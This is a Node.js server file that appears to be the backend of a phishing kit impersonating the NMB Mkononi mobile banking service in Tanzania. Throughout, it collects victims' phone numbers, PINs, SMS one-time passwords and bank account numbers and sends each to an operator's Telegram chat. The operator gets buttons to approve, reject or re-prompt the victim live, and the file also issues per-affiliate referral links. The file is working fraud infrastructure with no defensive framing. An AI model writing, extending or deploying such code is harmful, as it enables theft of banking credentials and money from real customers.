const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

// Telegram Configuration (Replace or use Environment Variables)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE'; // Main Admin Chat ID

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Store active sessions in memory
const sessions = {}; 

// Send message to specific Telegram Chat ID with Inline Keyboards
async function sendTelegramMessage(chatId, text, replyMarkup) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.log('Telegram Token not configured. Message would be:', text);
        return;
    }
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML',
                reply_markup: replyMarkup
            })
        });
        return await response.json();
    } catch (err) {
        console.error('Telegram send error:', err);
    }
}

// Helper to remove inline keyboard markup once clicked (fades/disables buttons)
async function removeInlineKeyboard(chatId, messageId, originalText, statusLabel) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: `${originalText}\n\n<b>Status: [ ${statusLabel} ]</b>`,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            })
        });
    } catch (err) {
        console.error('Edit message error:', err);
    }
}

// 1. Submit Application / PIN (Step 1) -> Admin: ALLOW / DENY
app.post('/api/submit-application', async (req, res) => {
    const { sessionId, phone, pin } = req.body;
    sessions[sessionId] = { phone, pin, clientRes: res, step: 'pin_pending' };

    const message = `🚨 <b>NMB MKONONI - NEW SUBMISSION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `🔑 <b>PIN Entered:</b> ${pin}\n\n` +
                    `<i>Choose action for applicant:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ ALLOW', callback_data: `allow_${sessionId}` },
                { text: '❌ DENY', callback_data: `deny_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        sessions[sessionId].adminMsgId = sent.result.message_id;
    }
});

// 2. Submit OTP -> Admin: PROCEED / STOP
app.post('/api/submit-otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].otp = otp;
        sessions[sessionId].clientRes = res;
        sessions[sessionId].step = 'otp_pending';
    }

    const phone = sessions[sessionId] ? sessions[sessionId].phone : 'Unknown';

    const message = `🔐 <b>NMB MKONONI - OTP VERIFICATION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `🔑 <b>SMS OTP:</b> ${otp}\n\n` +
                    `<i>Verify OTP:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '✅ PROCEED', callback_data: `otp_proceed_${sessionId}` },
                { text: '🛑 STOP', callback_data: `otp_stop_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        sessions[sessionId].adminMsgId = sent.result.message_id;
    }
});

// 3. Submit 11-digit NMB Bank Account -> Admin options
app.post('/api/submit-account', async (req, res) => {
    const { sessionId, accountNumber } = req.body;
    if (sessions[sessionId]) {
        sessions[sessionId].accountNumber = accountNumber;
        sessions[sessionId].clientRes = res;
        sessions[sessionId].step = 'acc_pending';
    }

    const phone = sessions[sessionId] ? sessions[sessionId].phone : 'Unknown';

    const message = `🏦 <b>NMB MKONONI - BANK ACCOUNT SUBMISSION</b>\n\n` +
                    `📱 <b>Phone:</b> +255${phone}\n` +
                    `💳 <b>Account Number (11 digits):</b> ${accountNumber}\n\n` +
                    `<i>Select final verification status:</i>`;

    const replyMarkup = {
        inline_keyboard: [
            [
                { text: '⚠️ WRONG PIN', callback_data: `err_pin_${sessionId}` },
                { text: '⚠️ WRONG OTP', callback_data: `err_otp_${sessionId}` }
            ],
            [
                { text: '🚫 INVALID ACC', callback_data: `err_acc_${sessionId}` },
                { text: '🎉 APPROVED', callback_data: `approve_${sessionId}` }
            ]
        ]
    };

    const sent = await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
    if (sent && sent.result && sent.result.message_id) {
        sessions[sessionId].adminMsgId = sent.result.message_id;
    }
});

// Poll endpoint for client to check admin decision status
app.get('/api/check-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions[sessionId];
    if (!session || !session.status) {
        return res.json({ status: 'pending' });
    }
    const currentStatus = session.status;
    delete session.status;
    res.json({ status: currentStatus });
});

// Telegram Webhook / Callback handler endpoint
app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body;

    // Handle /start command from any user/subadmin privately to receive their link and info
    if (update && update.message && update.message.text) {
        const messageObj = update.message;
        const chatId = messageObj.chat.id;
        const text = messageObj.text.trim();
        
        if (text === '/start') {
            const firstName = messageObj.from.first_name || 'User';
            const lastName = messageObj.from.last_name || '';
            const fullName = `${firstName} ${lastName}`.trim();
            const username = messageObj.from.username ? `@${messageObj.from.username}` : 'None';
            const userId = messageObj.from.id;

            const privateLink = `${req.protocol}://${req.get('host')}?ref=${chatId}`;
            
            const welcomeMsg = `Karibu kwenye NMB Mkononi Tanzania, <b>${fullName}</b>!\n\n` +
                               `📋 <b>Taarifa Zako Binafsi (Personal Info):</b>\n` +
                               `• Jina: <b>${fullName}</b>\n` +
                               `• Username: <b>${username}</b>\n` +
                               `• Telegram ID: <code>${userId}</code>\n` +
                               `• Chat ID: <code>${chatId}</code>\n\n` +
                               `🔗 <b>Kiungo Chako Maalum (Your Private Link):</b>\n${privateLink}`;
            
            await sendTelegramMessage(chatId, welcomeMsg, null);
            return res.sendStatus(200);
        }
    }

    // Handle Admin Inline Keyboard Button Clicks & Fade Buttons Away
    if (update && update.callback_query) {
        const query = update.callback_query;
        const data = query.data; 
        const parts = data.split('_');
        
        let action, sessionId;
        if (data.startsWith('otp_')) {
            action = `otp_${parts[1]}`;
            sessionId = parts[2];
        } else if (data.startsWith('err_')) {
            action = `err_${parts[1]}`;
            sessionId = parts[2];
        } else {
            action = parts[0];
            sessionId = parts[1];
        }

        const session = sessions[sessionId];
        if (session) {
            const clientRes = session.clientRes;
            let statusLabel = '';
            
            if (action === 'allow' || action === 'otp_proceed') {
                session.status = 'next_step';
                statusLabel = action === 'allow' ? 'ALLOWED' : 'PROCEEDED';
                if (clientRes) clientRes.json({ success: true, status: 'next_step' });
            } else if (action === 'deny' || action === 'otp_stop' || action === 'err_pin') {
                session.status = 'restart_pin';
                statusLabel = 'WRONG PIN / DENIED';
                if (clientRes) clientRes.json({ success: false, status: 'restart_pin', message: 'Wrong PIN / Denied.' });
            } else if (action === 'err_otp') {
                session.status = 'restart_otp';
                statusLabel = 'WRONG OTP';
                if (clientRes) clientRes.json({ success: false, status: 'restart_otp', message: 'Wrong OTP.' });
            } else if (action === 'err_acc') {
                session.status = 'restart_acc';
                statusLabel = 'INVALID ACCOUNT';
                if (clientRes) clientRes.json({ success: false, status: 'restart_acc', message: 'Invalid Account Number.' });
            } else if (action === 'approve') {
                session.status = 'success';
                statusLabel = 'APPROVED 🎉';
                if (clientRes) clientRes.json({ success: true, status: 'success' });
            }

            // Fade/remove inline buttons from the original admin message
            if (session.adminMsgId && query.message) {
                const originalText = query.message.text || 'NMB Mkononi Submission';
                await removeInlineKeyboard(TELEGRAM_CHAT_ID, session.adminMsgId, originalText, statusLabel);
            }
        }
        
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: query.id, text: 'Action registered successfully!' })
            });
        }
    }
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`NMB Mkononi Tanzania server running on port ${PORT}`);
});
                
